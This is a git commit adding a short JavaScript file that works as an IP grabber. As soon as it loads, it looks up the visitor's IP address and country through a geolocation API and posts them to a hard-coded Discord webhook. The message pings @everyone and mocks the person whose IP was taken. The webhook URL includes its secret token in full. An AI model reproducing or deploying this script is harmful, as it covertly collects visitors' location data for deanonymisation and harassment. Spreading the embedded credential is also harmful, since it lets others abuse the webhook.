8f60e637a579d972c49c0de1fec243a17060fb6a
diabelekuwu <104534065+diabelekuwu@users.noreply.github.com>
2022-08-30 12:33:40 +0200

    Add files via upload

---
+++ javascript.js
@@ -0,0 +1,36 @@
+var webHookUrl = "https://discord.com/api/webhooks/1014118740041928735/JhjY8UKgMWmgVEddD4mR0EfKVun71Z9Xe08HMILs2yRrdYInnTpe7uZ_kglfiNLNQGID";
+
+$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
+  console.log(JSON.stringify(data, null, 2));
+});
+
+const request = async () => { // Calling a "synchronous" fetch
+    const response = await fetch('https://api.db-ip.com/v2/free/self');
+    const data = await response.json();
+    console.log(data);
+
+    // Declaring variables
+    var ip = data.ipAddress;
+    var country = data.countryName;
+
+    // Open POST Request
+    var postRequest = new XMLHttpRequest();
+    postRequest.open("POST", webHookUrl);
+
+    postRequest.setRequestHeader('Content-type', 'application/json');
+
+    var params = {
+        username:   "kutas",
+        avatar_url: "",
+        content:    "**L PIPO DIABEL MA IP** @everyone \n" + 
+		    "__**:globe_with_meridians: IP Address:**__ \n" +
+                    "`" + ip + "` \n \n" +
+		    "__**Country:**__ \n" +
+		    "`" + country + "`"
+    }
+
+    postRequest.send(JSON.stringify(params));
+
+}
+
+request();
